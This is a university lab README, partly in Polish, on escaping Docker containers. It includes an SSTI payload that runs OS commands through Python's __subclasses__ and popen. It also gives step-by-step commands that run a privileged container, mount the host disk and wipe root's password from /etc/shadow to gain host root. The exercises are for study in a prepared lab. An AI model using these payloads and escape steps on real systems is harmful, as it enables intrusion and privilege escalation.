
# Docker-Escape
This project shows vulnerability how to escape from Docker container in which web application is running. <br />

## About
This project was made for academic purposes during one of our courses at the AGH University of Krakow. <br />
We present security issues in Docker. We show vulnerabilities of this software and best practices related to them. Below we also include case-studies showing how to get into the server from the user level of a web application, how to escape from this container and the possibilities that open up to us after such an escape.<br />

  
## Authors:
[Huber Mąka](https://github.com/norka02) <br />
[Karol Makara](https://github.com/KarolMakara) <br />
[Jakub Kowal](https://github.com/jd-kowal) <br />

*** 

# Tasks


## Task 0 - Przygotowanie środowiska
Aby rozpocząć wykonywanie zadań sklonujcie repozytorium. <br />
Będziemy używać Dockera (kontener w kontenerze). Całość jest przygotowana w docker.file. <br />
Następnie wykonaj poniższe komendy. <br />

Build:
```bash: 
docker build -t ubuntu-dind
```

Run:
```bash: 
docker run -d -p 5000:5000 --privileged --hostname ubuntu-dind --name ubuntu-dind ubuntu-dind
```

Enter:<br />
```bash: 
docker exec -itu adam ubuntu-dind bash
```

**TIP** - w przypadku problemów -> zrestartuj kontener 

## Task 1 - Dostęp do serwera z perspektywy użytkownika aplikacji webowej
Na kontenerze jest uruchomiona aplikacja webowa. Znając jej podatność omówioną podczas prezentacji spróbuj za pomocą preparacji url-a wykonać podstawowy pentesting (np. podawany podczas prezentacji przykład wyrażenia 7*7). <br />
Następnie jeżeli w wyniku wcześniejszego przykładu otrzymasz wynik 49 to możemy przejść dalej. <br />
Do następnej czynności będziemy potrzebowali poniższej komendy. <br />

```
"baiim".__class__.__base__.__subclasses__()[<Liczba_Którą_Znalazłeś>].__init__.__globals__['sys'].modules['os'].popen(<Twoja_Komenda>).read()
```

Najpierw jednak musimy znaleźć **LICZBĘ**. Aby ją odszukać użyj programu ``hack.py`` w konsoli.

**Odpowiedź** - wyślij ss, który wylistuje wszystkie pliki i katalogi z aktualnego katalogu (wpisz tą komendę w popen()) 

## Task 2 - Docker Escape & Privilege Escalation
**TIP** - proponujemy przejście z wykonywaniem zadań do terminala. <br />
Ucieczkę z kontenera umożliwia nam złe skonfigurowanie kontenera. <br />

Spróbuj zmienić użytkownika na root-a (nie powinieneś mieć takiej możliwości - powinieneś być na adamie) {**PE**}: 
```
su root
```
Sprawdź listę dostępnych obrazów:
```
docker images
```
Pobierz obraz dockera z repozytorium:
```
docker pull ubuntu
```
![image1](https://github.com/norka02/Docker-Escape/assets/94318576/daff8699-e65e-4b32-a762-a6ba73781618)
Po pobraniu sprawdź czy obraz pobrał się poprawnie za pomocą:
```
docker images
```
Będąc na użytkowniku **adam** uruchom kontener {**DE**}:
```
docker run --rm -it --name kontener-adama --hostname ubuntu-by-adam --privileged ubuntu bash
```
Teraz jesteś wewnątrz swojego kontenera, którego przed chwilą stworzyłeś. Możesz to sprawdzić za pomocą komend ``whoami`` oraz ``hostname``. <br />
Przykładowy ScreenShot znajduje się poniżej.
<< ScreenShot >>
Jak możesz zauważyć tworząc własny kontener masz w nim uprawnienia root-a. <br />
Następnie stwórz w swoim kontenerze z obrazem ubuntu katalog: <br />
```bash
mkdir -p /mnt/share
```
Oraz podmontuj odpowiednią partycję dysku do tego katalogu np. /dev/sdc: <br />
```bash
mount /dev/sdc /mnt/share
```
Domyślnie polecenie mount nadaje ci prawa do zapisu i odczytu, ale jeśli wystąpiłby przykładowo taki komunikat: <br />
<img> <br />
Zmień partycję dysku. Listę partycji możesz uzyskać za pomocą polecenia: <br />
```bash
lsblk
```
Dzięki podmontowaniu partycji jesteśmy w stanie uzyskać dostep do struktury katalogów hosta. Spróbuj przedostać się do zewnętrznego systemu plików, odnajdź pliki ``/etc/shadow`` oraz ``/etc/passwd`` i usuń w nich elementy odpowiadające za uwierzytelnienie użytkownika root. <br />
Teraz wykonujemy poniższą komendę:
```bash
apt update
```

Musimy zainstalować w kontenerze wybrany przez siebie edytor tekstowy (np. vim, nano). 
```bash
apt install vim
```
Sprawdź czy masz dostęp do struktury katalogów hosta:
```bash
 ls -l /mnt/share 
```
Za pomocą edytora tekstowego otwieramy plik ``/etc/shadow`` oraz ``/etc/passwd``. 
```bash
vim /mnt/share/etc/passwd
```
Trzeba usunąć część wskazującą na obecność hasła root-a w pliku shadow {**PE**}. <br />

<<<<<<<<SSx2>>>>>>>>


<< ScreenShot >>
Wyjdź z kontenera za pomocą ``exit``. <br />
Zmień użytkownika na root-a {**PE**}:
```
su root
```

**Odpowiedź** - wyślij ss potwierdzającego twoje uprawnienia root-a. 

## Task 3 - Mini-CTF
Mając uprawnienia root-a możesz poruszać się bezproblemowo po systemie. Znajdź katalog, który nie powinien znajdować się w systemie/wyróżnia się spośród pozostałych. W nim znajduje się plik z flagą. Zmodyfikuj znaleziony plik dodając swoje imię i nazwisko. <br />

**Odpowiedź** - wyślij widoczną zmodyfikowaną flagę wraz z dopisanym unikalnym tekstem wymienionym wyżej oraz ścieżkę do katalogu, w którym znajduje się znaleziona flaga. 

## Task 4 - Tworzenie Bezpiecznego Kontenera
Posiadając całą wiedzę zdobytą podczas prezentacji oraz poprzednich tasków zastanów się w jaki sposób możesz zabezpieczyć kontener przed różnymi wektorami ataków. <br />
Stwórz kontener, który spełnia wszystkie best-practice dot. bezpiecznego tworzenia kontenera Dockera. <br />
<br />
**Odpowiedź** - wyślij widoczną komendę, która tworzy **Bezpieczny Kontener**. <br />
